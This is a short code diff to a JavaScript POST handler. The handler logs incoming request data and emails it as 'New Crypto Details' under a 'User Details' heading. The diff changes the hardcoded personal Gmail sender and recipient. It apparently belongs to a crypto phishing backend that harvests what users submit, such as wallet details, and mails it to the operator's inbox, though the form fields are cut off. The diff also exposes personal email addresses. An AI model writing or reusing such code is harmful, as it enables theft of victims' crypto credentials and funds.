@@ -11,8 +11,8 @@ export async function POST(req){
     const body = await req.json();
     console.log(body)
     const message = {
-        from: "christariccykid55@gmail.com",
-        to: "meliodasdemonk8ng@gmail.com",
+        from: "meshackchuck@gmail.com",
+        to: "owerboy36@gmail.com",
         subject: "New Crypto Details",
         html: `
             <h3>User Details</h3>
